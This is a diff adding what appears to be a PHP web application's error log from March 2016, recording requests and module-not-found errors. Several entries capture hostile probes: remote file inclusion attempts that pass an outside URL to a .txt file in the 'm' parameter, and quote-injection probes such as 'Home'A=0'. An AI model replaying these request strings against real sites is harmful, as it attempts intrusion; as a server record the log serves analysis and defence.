@@ -1,0 +1,48 @@
+[ 2016-03-14T00:39:05+08:00 ] 186.247.207.113 /index.php?m=http://www.hatchbacki.ru/libraries/phpmailer/hatchbacki_reg.txt?
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000011s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000051s ]
+ERR: _MODULE_NOT_EXIST_:Http://www.hatchbacki.ru/libraries/phpmailer/hatchbacki_reg.txt?
+
+[ 2016-03-14T02:39:26+08:00 ] 186.247.207.113 /index.php?m=http://www.hatchbacki.ru/libraries/phpmailer/hatchbacki_reg.txt?
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000012s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000055s ]
+ERR: _MODULE_NOT_EXIST_:Http://www.hatchbacki.ru/libraries/phpmailer/hatchbacki_reg.txt?
+
+[ 2016-03-14T03:22:50+08:00 ] 66.249.83.166 /?m=product&a=smartDetail&id=18
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000057s ]
+ERR: _MODULE_NOT_EXIST_:Product
+
+[ 2016-03-14T03:22:50+08:00 ] 66.249.83.166 /?m=product&a=smartDetail&id=18
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000011s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000051s ]
+ERR: _MODULE_NOT_EXIST_:Product
+
+[ 2016-03-14T07:52:55+08:00 ] 83.46.149.120 /index.php?m=Home'A=0&c=Article&a=detail&id=239
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000012s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000054s ]
+ERR: _MODULE_NOT_EXIST_:Home'A=0
+
+[ 2016-03-14T14:22:38+08:00 ] 185.117.155.13 /index.php?m=Home'A=0&c=Article&a=detail&cid=38&id=237
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000011s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000056s ]
+ERR: _MODULE_NOT_EXIST_:Home'A=0
+
+[ 2016-03-14T21:56:37+08:00 ] 83.46.149.120 /index.php?m='0=A&c=Article&a=detail&id=239
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000011s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000049s ]
+ERR: _MODULE_NOT_EXIST_:'0=A
+
+[ 2016-03-14T22:03:59+08:00 ] 62.183.124.129 /index.php?m=Home'A=0&c=Index&a=service
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000012s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000056s ]
+ERR: _MODULE_NOT_EXIST_:Home'A=0
+
